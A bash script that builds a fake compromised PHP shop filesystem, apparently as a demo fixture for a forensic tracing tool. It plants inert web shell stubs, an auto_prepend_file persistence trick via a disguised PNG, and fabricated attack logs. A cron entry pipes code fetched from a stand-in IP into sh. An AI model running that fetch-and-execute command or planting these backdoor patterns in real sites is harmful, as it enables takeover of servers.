#!/usr/bin/env bash
# Builds a throw-away filesystem tree that looks like a small compromised
# PHP site, for demos and screenshots of `bastion trace --sysroot`.
# Every planted "backdoor" is inert: the code sits behind `if (false)` and
# decodes to the word "demo". IPs come from documentation ranges (RFC 5737).
set -euo pipefail
LAB=${1:?usage: lab.sh <dir>}
rm -rf "$LAB"
mkdir -p "$LAB"
w() { mkdir -p "$(dirname "$LAB/$1")"; cat > "$LAB/$1"; [ -n "${2:-}" ] && touch -d "$2" "$LAB/$1" || true; }

w etc/os-release <<'X'
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
ID=debian
VERSION_ID="12"
X
w etc/passwd <<'X'
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
X
w etc/nginx/sites-enabled/shop <<'X'
server {
    server_name shop.example;
    root /var/www/shop/public;
    access_log /var/log/nginx/shop.access.log;
    location ~ \.php$ { fastcgi_pass unix:/run/php/php8.2-fpm.sock; }
}
X
for f in index.php cart.php checkout.php lib/db.php lib/session.php; do
  w "var/www/shop/public/$f" "2026-06-02 09:12" <<'X'
<?php
declare(strict_types=1);
require __DIR__ . '/../vendor/autoload.php';
echo htmlspecialchars($_GET['q'] ?? '', ENT_QUOTES);
X
done
w var/www/shop/public/wp-content/uploads/2026/10/thumb.php "2026-10-21 16:04:11" <<'X'
<?php /* demo fixture — inert */ if (false) { eval(base64_decode('ZGVtbw==')); }
X
w var/www/shop/public/lib/compat.php "2026-10-21 16:05:02" <<'X'
<?php /* demo fixture — inert */ if (false) { $_POST['k']($_POST['v']); }
X
mkdir -p "$LAB/var/www/shop/public/img"
printf '\x89PNG\r\n\x1a\n<?php /* demo fixture — inert */ ?>' > "$LAB/var/www/shop/public/img/.cache.png"
touch -d "2026-10-21 16:05:40" "$LAB/var/www/shop/public/img/.cache.png"
w var/www/shop/public/.user.ini "2026-10-21 16:06:15" <<'X'
auto_prepend_file = /var/www/shop/public/img/.cache.png
X
w var/spool/cron/crontabs/www-data "2026-10-21 16:09:30" <<'X'
*/10 * * * * curl -fsSL http://198.51.100.23/u | sh
X
w var/log/php8.2-fpm.log "2026-10-21 16:03:10" <<'X'
[21-Oct-2026 15:58:41] WARNING: [pool www] child 3812 exited on signal 11 (SIGSEGV) after 41.200713 seconds from start
[21-Oct-2026 15:58:43] WARNING: [pool www] child 3820 exited on signal 11 (SIGSEGV) after 2.004112 seconds from start
[21-Oct-2026 16:01:07] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in Unknown on line 0
[21-Oct-2026 16:03:09] WARNING: [pool www] child 3851 exited on signal 11 (SIGSEGV) after 0.912034 seconds from start
X
w var/log/nginx/shop.access.log "2026-10-22 02:10:00" <<'X'
198.51.100.23 - - [21/Oct/2026:16:04:20 +0000] "POST /wp-content/uploads/2026/10/thumb.php HTTP/1.1" 200 31 "-" "Mozilla/5.0"
198.51.100.23 - - [21/Oct/2026:16:05:12 +0000] "POST /lib/compat.php HTTP/1.1" 200 8 "-" "Mozilla/5.0"
198.51.100.23 - - [21/Oct/2026:16:07:55 +0000] "GET /lib/compat.php?cmd=whoami HTTP/1.1" 200 9 "-" "curl/8.5.0"
203.0.113.40 - - [21/Oct/2026:18:22:03 +0000] "GET /index.php HTTP/1.1" 200 5120 "-" "Mozilla/5.0"
198.51.100.23 - - [22/Oct/2026:02:09:41 +0000] "POST /lib/compat.php HTTP/1.1" 200 8 "-" "Mozilla/5.0"
X
echo "lab ready: $LAB"
